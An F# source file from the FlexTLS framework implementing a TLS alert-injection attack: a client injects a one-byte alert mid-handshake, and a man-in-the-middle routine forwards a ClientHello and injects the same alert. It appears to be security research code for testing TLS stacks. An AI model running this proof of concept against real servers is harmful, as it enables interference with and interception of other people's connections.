(*
 * Copyright 2015 INRIA and Microsoft Corporation
 * 
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * 
 *     http://www.apache.org/licenses/LICENSE-2.0
 * 
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *)

#light "off"

module FlexApps.Attack_Alert

open Bytes
open TLSInfo

open FlexTLS
open FlexTypes
open FlexConstants
open FlexConnection
open FlexHandshake
open FlexClientHello
open FlexServerHello
open FlexAlert
open FlexState
open FlexCertificate
open FlexServerHelloDone
open FlexClientKeyExchange
open FlexCCS
open FlexFinished
open FlexAppData
open FlexSecrets

type Attack_Alert =
    class

    static member httpRequest host =
        sprintf "GET / HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\n\r\n" host

    static member client (server_name:string, ?port:int) : state =
        let port = defaultArg port FlexConstants.defaultTCPPort in

        // Connect to the server
        let st,_ = FlexConnection.clientOpenTcpConnection(server_name,server_name,port) in

        // Start a typical RSA handshake with the server
        let st,nsc,fch = FlexClientHello.send(st) in
        let st,nsc,fsh = FlexServerHello.receive(st,fch,nsc) in

        // *** Inject a one byte alert on behalf of the attacker ***
        let st = FlexAlert.send(st,Bytes.abytes [|1uy|]) in

        // Continue the typical RSA handshake
        let st,nsc,fcert = FlexCertificate.receive(st,Client,nsc) in
        let st,fshd      = FlexServerHelloDone.receive(st) in
        let st,nsc,fcke  = FlexClientKeyExchange.sendRSA(st,nsc,fch) in
        let st,_         = FlexCCS.send(st) in

        // Start encrypting
        let st           = FlexState.installWriteKeys st nsc in

        let st,cff       = FlexFinished.send(st,nsc,role=Client) in
        let st,_,_       = FlexCCS.receive(st) in

        // Start decrypting
        let st           = FlexState.installReadKeys st nsc in

        let st,sff       = FlexFinished.receive(st,nsc,Server) in

        // RSA handshake is over. Send some plaintext
        let request = Attack_Alert.httpRequest server_name in
        let st = FlexAppData.send(st,request) in
        printf "---> %s" request;
        let st,b = FlexAppData.receive(st) in
        let response = System.Text.Encoding.ASCII.GetString(cbytes b) in
        printf "<--- %s" response;

        // Close a connection by sending a close_notify alert
        let st = FlexAlert.send(st,TLSError.AD_close_notify) in

        (* *** Here we'd expect either a close_notify from the peer,
               or the connection to be shut down.
               However, the peer mis-interpreted our alert, and is now
               waiting for more data. *)
        printf "Sending close notify. Going unresponsive...\n";
        let st,ad,_ = FlexAlert.receive(st) in
        printf "Alert: %A" ad;
        ignore (System.Console.ReadLine());
        st

     static member runMITM (accept, server_name:string, ?port:int) : state * state =
        let port = defaultArg port FlexConstants.defaultTCPPort in

        // Start being a Man-In-The-Middle
        let sst,_,cst,_ = FlexConnection.MitmOpenTcpConnections("0.0.0.0",server_name,listen_port=6666,server_cn=server_name,server_port=port) in

        // Forward client hello
        let sst,cst,_ = FlexHandshake.forward(sst,cst) in

        // *** Inject a one byte alert on behalf of the attacker ***
        let cst = FlexAlert.send(cst,Bytes.abytes [|1uy|]) in

        // Passthrough mode
        let _ = FlexConnection.passthrough(cst.ns,sst.ns) in
        sst,cst

    end
